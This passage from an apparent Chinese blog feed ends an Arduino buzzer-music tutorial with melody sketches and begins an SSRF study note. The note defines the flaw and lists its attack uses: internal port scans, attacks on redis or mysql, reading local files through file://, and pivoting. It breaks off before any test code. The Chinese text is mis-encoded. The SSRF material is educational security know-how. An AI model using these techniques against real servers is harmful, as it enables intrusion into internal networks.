class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"><span class="comment">/******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* è¿™éƒ¨åˆ†å°±æ˜¯æ•´é¦–æ›²å­çš„éŸ³ç¬¦éƒ¨åˆ†,ç”¨äº†ä¸€ä¸ªåºåˆ—å®šä¹‰ä¸ºtuneï¼Œæ•´æ•° */</span></span><br><span class="line"><span class="keyword">int</span> tune[] = &#123;</span><br><span class="line">  A0,A0,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH1,A5,A6,A3,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH3,AH1,AH2,A6,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH1,A5,A6,A3,A5,A1,A2,</span><br><span class="line">  A3,AH1,A6,AH3,</span><br><span class="line">  AH2,AH3,AH2,AH1,AH2,A6,A0,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,A5,A5,A6,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,AH4,AH4,AH3,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,A5,A5,A6,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  AH6,A5,A5,A6,A6</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/****************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* è¿™éƒ¨åˆ†æ˜¯æ•´é¦–æ›²å­çš„æ¥æ‹éƒ¨åˆ†ï¼Œä¹Ÿå®šä¹‰ä¸ªåºåˆ—durationï¼Œæµ®ç‚¹ï¼ˆæ•°ç»„çš„ä¸ªæ•°å’Œå‰é¢éŸ³ç¬¦çš„ä¸ªæ•°æ˜¯ä¸€æ ·çš„ï¼‰ */</span></span><br><span class="line"><span class="keyword">float</span> duration[]= &#123;</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**********************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> length;     <span class="comment">/* è¿™é‡Œå®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œåé¢ç”¨æ¥è¡¨ç¤ºå…±æœ‰å¤šå°‘ä¸ªéŸ³ç¬¦ */</span></span><br><span class="line"><span class="keyword">int</span> tonePin=<span class="number">8</span>; <span class="comment">/* èœ‚é¸£å™¨çš„pin */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* è®¾ç½®èœ‚é¸£å™¨çš„pinä¸ºè¾“å‡ºæ¨¡å¼ */</span></span><br><span class="line">  <span class="built_in">pinMode</span>(tonePin,<span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="comment">/* è¿™é‡Œç”¨äº†ä¸€ä¸ªsizeofå‡½æ•°ï¼Œå¯ä»¥æŸ¥å‡ºtoneåºåˆ—é‡Œæœ‰å¤šå°‘ä¸ªéŸ³ç¬¦ */</span></span><br><span class="line">  length = <span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* å¾ªç¯éŸ³ç¬¦çš„æ¬¡æ•° */</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)&#123;</span><br><span class="line">    <span class="comment">/* æ­¤å‡½æ•°ä¾æ¬¡æ’­æ”¾tuneåºåˆ—é‡Œçš„æ•°ç»„ï¼Œå³æ¯ä¸ªéŸ³ç¬¦ */</span></span><br><span class="line">    <span class="built_in">tone</span>(tonePin,tune[x]);</span><br><span class="line">    <span class="comment">/* æ¯ä¸ªéŸ³ç¬¦æŒç»­çš„æ—¶é—´ï¼Œå³èŠ‚æ‹durationï¼Œ450æ˜¯è°ƒæ•´æ—¶é—´çš„è¶Šå¤§ï¼Œæ›²å­é€Ÿåº¦è¶Šæ…¢ */</span></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">450</span>*duration[x]);</span><br><span class="line">    <span class="comment">/* åœæ­¢å½“å‰éŸ³ç¬¦ï¼Œè¿›å…¥ä¸‹ä¸€éŸ³ç¬¦ */</span></span><br><span class="line">    <span class="built_in">noTone</span>(tonePin);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* ç­‰å¾…5ç§’ï¼Œé‡æ–°å¼€å§‹å¾ªç¯ */</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E7%88%B1%E6%8B%BC%E6%89%8D%E4%BC%9A%E8%B5%A2.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC0 -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC1 262</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC2 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC3 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC4 350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC5 393</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC6 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC7 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL1 131</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL2 147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL3 165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL4 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL5 196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL6 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL7 248  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH1 525</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH2 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH3 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH4 700</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH5 786</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH6 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH7 990</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ—å‡ºå…¨éƒ¨Cè°ƒçš„é¢‘ç‡</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ—å‡ºæ‰€æœ‰èŠ‚æ‹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tune[]=                 <span class="comment">//æ ¹æ®ç®€è°±åˆ—å‡ºå„é¢‘ç‡</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  NTC5,NTC5,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH1,NTC6,NTC5,NTC6,NTCH1,NTC6,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC3,NTC3,NTC3,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC6,NTC5,NTCH3,NTCH3,NTCH2,NTCH1,</span><br><span class="line"></span><br><span class="line">  NTCH2,NTCH1,NTCH2,</span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH3,NTCH2,NTCH3,NTCH2,NTCH1,NTCH2,NTCH1,NTC6,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTCH2,NTCH2,NTCH1,NTC6,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC5,NTC5,NTCH1,NTC6,NTC5,NTC1,NTC3,</span><br><span class="line"></span><br><span class="line">  NTC2,NTC1,NTC2,</span><br><span class="line"></span><br><span class="line">  NTC3,NTC5,NTC5,NTC3,NTCH1,NTC7,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC5,NTC6,NTCH1,NTCH2,NTCH3,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH2,NTCH1,NTC5,NTCH1,NTCH2,NTCH3,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTC0,NTCH3,NTCH2,</span><br><span class="line"></span><br><span class="line">  NTCH1,NTC0,NTCH2,NTCH1,NTC6,NTC0,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTC6,NTCH1,NTCH1,NTCH1,NTC6,NTC5,NTC3,</span><br><span class="line"></span><br><span class="line">  NTC5,</span><br><span class="line"></span><br><span class="line">  NTC5,NTC6,NTCH1,NTC7,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH3,NTCH3,NTCH3,NTCH2,NTCH2,NTCH1,</span><br><span class="line"></span><br><span class="line">  NTC6,NTCH3,NTCH2,NTCH1,NTCH2,NTCH1,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH1,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> durt[]=                   <span class="comment">//æ ¹æ®ç®€è°±åˆ—å‡ºå„èŠ‚æ‹</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tonepin=<span class="number">8</span>;   <span class="comment">//å¾—ç”¨8å·æ¥å£</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pinMode</span>(tonepin,<span class="literal">OUTPUT</span>);</span><br><span class="line"></span><br><span class="line">  length=<span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);   <span class="comment">//è®¡ç®—é•¿åº¦</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">tone</span>(tonepin,tune[x]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">500</span>*durt[x]);   <span class="comment">//è¿™é‡Œç”¨æ¥æ ¹æ®èŠ‚æ‹è°ƒèŠ‚å»¶æ—¶ï¼Œ500è¿™ä¸ªæŒ‡æ•°å¯ä»¥è‡ªå·±è°ƒæ•´ï¼Œåœ¨è¯¥éŸ³ä¹ä¸­ï¼Œæˆ‘å‘ç°ç”¨500æ¯”è¾ƒåˆé€‚ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">noTone</span>(tonepin);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><blockquote><p>ç¾å¦™çš„éŸ³ä¹æ€»æ˜¯é‚£ä¹ˆçŸ­æš‚ï¼Œè¯•å¬ç»“æŸï¼</p></blockquote><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/u011481047/article/details/53257685">Arduino+èœ‚é¸£å™¨åˆ¶ä½œæœ‰è¶£çš„å°éŸ³ä¹</a></p><p>[2] <a href="https://www.geek-workshop.com/thread-288-1-1.html">Arduinoå­¦ä¹ ç¬”è®°â€”è¶…ç®€å•åˆ¶ä½œéŸ³ä¹</a></p><p>[3] <a href="https://blog.csdn.net/m0_37738838/article/details/95062958?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161742198916780262574621%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161742198916780262574621&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-13-95062958.pc_search_result_no_baidu_js&utm_term=arduino+%E8%9C%82%E9%B8%A3%E5%99%A8">Arduino èœ‚é¸£å™¨æ’­æ”¾éŸ³ä¹</a></p>]]></content>
      
      
      <categories>
          
          <category> Arduino </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRFæ¼æ´å­¦ä¹ </title>
      <link href="posts/18466.html"/>
      <url>posts/18466.html</url>
      
        <content type="html"><![CDATA[<h1 id="SSRFæ¦‚å¿µ"><a href="#SSRFæ¦‚å¿µ" class="headerlink" title="SSRFæ¦‚å¿µ"></a>SSRFæ¦‚å¿µ</h1><p>SSRFï¼ˆServer-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆå¹¶ç”±æœåŠ¡ç«¯å‘èµ·æ¶æ„è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚æ­£æ˜¯å› ä¸ºæ¶æ„è¯·æ±‚ç”±æœåŠ¡ç«¯å‘èµ·ï¼Œè€ŒæœåŠ¡ç«¯èƒ½å¤Ÿè¯·æ±‚åˆ°ä¸è‡ªèº«ç›¸è¿è€Œä¸å¤–ç½‘éš”ç»çš„å†…éƒ¨ç½‘ç»œç³»ç»Ÿï¼Œæ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFçš„æ”»å‡»ç›®æ ‡æ˜¯æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®çš„å†…ç½‘ç³»ç»Ÿã€‚</p><h1 id="SSRFçš„åŸç†"><a href="#SSRFçš„åŸç†" class="headerlink" title="SSRFçš„åŸç†"></a>SSRFçš„åŸç†</h1><p>SSRFæ¼æ´çš„å½¢æˆå¤§å¤šæ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½è€Œæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤å’Œé™åˆ¶ã€‚ä¾‹å¦‚ï¼Œé»‘å®¢æ“ä½œæœåŠ¡ç«¯ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ï¼Œåˆ©ç”¨çš„å°±æ˜¯æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ŒSSRFæ¼æ´å¯ä»¥åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„WEBåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/640"></p><h1 id="SSRFçš„å±å®³"><a href="#SSRFçš„å±å®³" class="headerlink" title="SSRFçš„å±å®³"></a>SSRFçš„å±å®³</h1><blockquote><ol><li>å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœåŠ¡å™¨æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯ç­‰ã€‚</li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœåŠ¡å™¨æœ¬åœ°çš„å…¶ä»–åº”ç”¨ç¨‹åºï¼Œå¦‚redisã€mysqlç­‰ã€‚</li><li>å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯ã€‚</li><li>æ”»å‡»å†…å¤–ç½‘çš„Webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨HTTP GET/POSTè¯·æ±‚å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼Œå¦‚sqlæ³¨å…¥ã€æ–‡ä»¶ä¸Šä¼ ç­‰ã€‚</li><li>åˆ©ç”¨fileåè®®è¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ç­‰ã€‚</li><li>è¿›è¡Œè·³æ¿æ”»å‡»ç­‰ã€‚</li></ol></blockquote><h1 id="SSRFæµ‹è¯•ä»£ç "><a href="#SSRFæµ‹è¯•ä»£ç " class="headerlink" title="SSRFæµ‹è¯•ä»£ç "></a>SSRFæµ‹è¯•ä»£ç 